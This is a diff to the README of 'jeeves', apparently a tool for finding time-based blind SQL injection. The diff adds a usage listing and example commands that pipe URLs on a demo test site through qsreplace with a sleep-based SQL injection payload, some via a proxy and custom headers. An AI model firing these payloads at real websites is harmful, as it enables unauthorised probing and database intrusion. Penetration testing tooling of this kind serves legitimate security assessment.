@@ -35,7 +35,9 @@ OR
     <br>
   
     Jeeves reads from stdin:
-  
+    
+   
+    
     `echo 'https://redacted.com/index.php?id=your_time_based_blind_payload_here' | jeeves --payload-time time_payload`
     <br>
   
@@ -53,9 +55,36 @@ OR
     <br>
     * Another examples of usage:
   
-    `echo "http://testphp.vulnweb.com/artists.php?artist=" | qsreplace "(select(0)from(select(sleep(5)))v)" | jeeves --payload-time 5`
+    
+      ```
+       Usage:
+       --payload-time,      The time from payload
+       --proxy              Send traffic to a proxy
+       -H, --headers        Custom Headers
+       -h                   Show This Help Message
+      ```
+       
+       
+  
+    Ex 1 - `echo "http://testphp.vulnweb.com/artists.php?artist=" | qsreplace "(select(0)from(select(sleep(5)))v)" | jeeves --payload-time 5`
+    
     <br>
-    `echo "http://testphp.vulnweb.com/artists.php?artist=" | qsreplace "(select(0)from(select(sleep(10)))v)" | jeeves --payload-time 10`
+    
+    Ex 2 - `echo "http://testphp.vulnweb.com/artists.php?artist=" | qsreplace "(select(0)from(select(sleep(10)))v)" | jeeves --payload-time 10`
+    
+    <br>
+    
+    Ex 3 - `echo "http://testphp.vulnweb.com/artists.php?artist=" | qsreplace "(select(0)from(select(sleep(5)))v)" | jeeves --payload-time 5 --proxy "http://179.67.16.10:8081"`
+    
+    <br>
+    
+    Ex 4 - `echo "http://testphp.vulnweb.com/artists.php?artist=" | qsreplace "(select(0)from(select(sleep(5)))v)" | jeeves --payload-time 5 --proxy "http://179.67.16.10:8081" -H "User-Agent: xxxx"`
+    
+    <br>
+    
+    You can specify more than one header, OBS: Be careful, the syntax must be exact the same, Ex:
+    
+    Ex 5 - `echo "http://testphp.vulnweb.com/artists.php?artist=" | qsreplace "(select(0)from(select(sleep(5)))v)" | jeeves --payload-time 5 --proxy -H "Testing: testing;OtherHeader: Value;Other2: Value"`
     
     TIP:
     
